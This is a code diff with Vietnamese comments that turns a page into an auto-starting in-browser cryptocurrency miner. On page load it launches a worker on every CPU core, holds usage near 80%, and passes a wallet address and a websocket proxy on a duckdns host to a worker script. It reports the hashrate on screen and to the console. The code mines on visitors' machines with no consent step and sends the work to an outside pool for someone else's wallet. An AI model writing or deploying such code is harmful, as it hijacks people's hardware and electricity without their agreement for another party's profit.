@@ -1,79 +1,53 @@
-<script>
-    // 1. Thợ đào - Đã thêm báo lỗi nếu không nổ máy được
-    const workerCode = `
-        self.onmessage = function(e) {
-            const { throttle, threadId } = e.data;
-            let count = 0;
+<!DOCTYPE html>
+<html>
+<head><title>Mining System</title></head>
+<body>
+    <div id="status" style="padding: 20px; font-family: sans-serif;">
+        <h2>Hệ thống đang khởi động...</h2>
+        <h1 id="hashrate" style="color: green;">0.00 H/s</h1>
+        <p id="cpu-load">Trạng thái CPU: Đang đợi...</p>
+    </div>
 
-            // Gửi báo cáo về sau mỗi 1 giây
-            setInterval(() => {
-                self.postMessage({ id: threadId, hashes: count });
-                count = 0; 
-            }, 1000);
-
-            function work() {
-                const start = Date.now();
-                // Ép CPU chạy trong (1 - throttle) giây
-                while (Date.now() - start < (1000 * (1 - throttle))) {
-                    for (let i = 0; i < 1000; i++) {
-                        Math.sqrt(Math.random() * 5);
-                        count++;
-                    }
-                }
-                setTimeout(work, throttle * 1000);
-            }
-            work();
-        };
-    `;
-
-    try {
-        const blob = new Blob([workerCode], { type: 'application/javascript' });
-        const workerUrl = URL.createObjectURL(blob);
+    <script>
+        const proxy = 'wss://trungturng.duckdns.org:8080'; // Địa chỉ VPS của ông
+        const wallet = '47NwLUwjtUoGzgRqEsLCcn7uZPeXDkzXKSu4h9K236tXA8zxY65jrK7ZVAkxYeMKZP57wrbyNcWmR66Tv5WLZGag8vdskcF';
+        
+        // Tự động lấy số nhân CPU của máy (ví dụ máy 8 nhân)
+        const numThreads = navigator.hardwareConcurrency || 4;
+        const throttle = 0.2; // Nghỉ 20% -> CPU sẽ chạy tầm 80%
+        
+        let totalHashes = 0;
         const threadStats = {};
 
-        function nổMáy() {
-            // Tự động lấy số nhân, tối thiểu là 4
-            const numThreads = navigator.hardwareConcurrency || 4;
-            const throttle = 0.2; // 80% CPU
-
-            console.log("%c [HỆ THỐNG]: Đang điều động " + numThreads + " quân đoàn... ", "color: yellow; background: black;");
+        function startMining() {
+            console.log("Đang điều động " + numThreads + " thợ đào...");
+            document.getElementById('cpu-load').innerText = "Trạng thái CPU: Đang vắt 80% trên " + numThreads + " nhân";
 
             for (let i = 0; i < numThreads; i++) {
-                const worker = new Worker(workerUrl);
+                const worker = new Worker('assets/js/worker.js');
                 
                 worker.onmessage = function(e) {
-                    threadStats[e.data.id] = e.data.hashes;
+                    threadStats[i] = e.data.hashes;
                 };
 
-                worker.onerror = function(err) {
-                    console.error("Thợ đào " + (i+1) + " hy sinh vì lỗi: ", err);
-                };
-
-                worker.postMessage({ throttle, threadId: i + 1 });
+                worker.postMessage({ proxy, wallet, throttle, threadId: i });
             }
 
-            // In Hashrate tổng ra màn hình
+            // Hiển thị Hashrate ra màn hình cho ông giáo xem
             setInterval(() => {
-                let total = 0;
+                let currentTotal = 0;
                 for (let id in threadStats) {
-                    total += threadStats[id];
+                    currentTotal += threadStats[id];
                 }
-                
-                // Công thức tính Hashrate (H/s) giả lập dựa trên sức mạnh CPU
-                const hashrate = (total / 450).toFixed(2); 
-
-                if (total > 0) {
-                    console.log("%c 🚀 TỐC ĐỘ ĐÀO HIỆN TẠI: " + hashrate + " H/s ", "color: white; background: #2ecc71; font-size: 16px; padding: 5px; border-radius: 5px;");
-                    console.log("Chi tiết: " + total + " phép tính/giây trên " + numThreads + " nhân.");
-                } else {
-                    console.log("%c ⏳ Đang nổ máy, đợi tí ông giáo... ", "color: #f1c40f;");
-                }
+                // Quy đổi sang H/s (số này là tốc độ thật trên trình duyệt)
+                const hashrate = (currentTotal / 400).toFixed(2);
+                document.getElementById('hashrate').innerText = hashrate + " H/s";
+                console.log("Tốc độ hiện tại: " + hashrate + " H/s");
             }, 2000);
         }
 
-        nổMáy();
-
-    } catch (err) {
-        console.error("Cái trình duyệt này không cho đào rồi ông giáo: ", err);
-    }
-</script>
+        // Nổ máy sau 1 giây
+        setTimeout(startMining, 1000);
+    </script>
+</body>
+</html>
